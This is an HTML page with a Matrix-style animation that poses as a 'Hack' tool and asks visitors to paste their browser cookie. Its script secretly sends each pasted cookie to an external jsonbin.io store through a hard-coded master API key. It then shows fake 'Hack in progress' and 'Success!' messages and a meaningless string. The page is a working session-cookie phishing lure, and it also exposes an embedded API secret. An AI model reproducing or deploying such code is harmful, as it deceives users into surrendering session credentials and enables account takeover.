<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Send Cookie</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }
    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: -1;
    }
    .container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
      color: #00ff00;
      text-align: center;
      width: 90%;
      max-width: 400px;
    }
    h1 {
      margin-bottom: 20px;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      margin-bottom: 15px;
      border: none;
      border-radius: 5px;
    }
    button {
      background-color: #00ff00;
      color: black;
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #33ff33;
    }
    #status {
      margin-top: 15px;
      font-size: 14px;
    }
  </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="container">
  <h1>Put the cookie to process</h1>
  <input type="text" id="cookieInput" placeholder="Paste your cookie here" />
  <button onclick="sendCookie()">Hack</button>
  <p id="status"></p>
</div>

<script>
  // Matrix animation
  const canvas = document.getElementById("matrix");
  const ctx = canvas.getContext("2d");

  canvas.height = window.innerHeight;
  canvas.width = window.innerWidth;

  const binary = "01";
  const chars = binary.split("");
  const fontSize = 14;
  const columns = canvas.width / fontSize;
  const drops = [];

  for (let x = 0; x < columns; x++) {
    drops[x] = 1;
  }

  function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#0F0";
    ctx.font = fontSize + "px monospace";

    for (let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);

      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }

  setInterval(draw, 33);

  // Cookie submission logic
  function sendCookie() {
    const cookie = document.getElementById("cookieInput").value.trim();
    const status = document.getElementById("status");

    if (!cookie) {
      status.textContent = "Please enter a cookie.";
      return;
    }

    status.textContent = "Hack in progress. Do not quit. Be patient.";

    // Step 1: Get existing cookies
    fetch('https://api.jsonbin.io/v3/b/68851d4ef7e7a370d1ee6177/latest', {
      headers: {
        'X-Master-Key': '$2a$10$ccUnGhZUQYLrGZNNzuRhgO3biHMpXDANF1jJTJnVo3iQZ3ryg9e0a'
      }
    })
    .then(res => res.json())
    .then(data => {
      let cookies = data.record.cookies || [];
      cookies.push(cookie);

      // Step 2: Send updated list
      return fetch('https://api.jsonbin.io/v3/b/68851d4ef7e7a370d1ee6177', {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'X-Master-Key': '$2a$10$ccUnGhZUQYLrGZNNzuRhgO3biHMpXDANF1jJTJnVo3iQZ3ryg9e0a'
        },
        body: JSON.stringify({ cookies })
      });
    })
    .then(res => res.json())
    .then(() => {
      setTimeout(() => {
        status.textContent = "Success!";
        setTimeout(() => {
          status.textContent = "Copy this cookie and paste it: a02jek822jsdufn721$+jsdu[jesu822393)";
        }, 1000);
      }, 2000);
    })
    .catch(() => {
      status.textContent = "Error sending cookie.";
    });
  }
</script>

</body>
</html>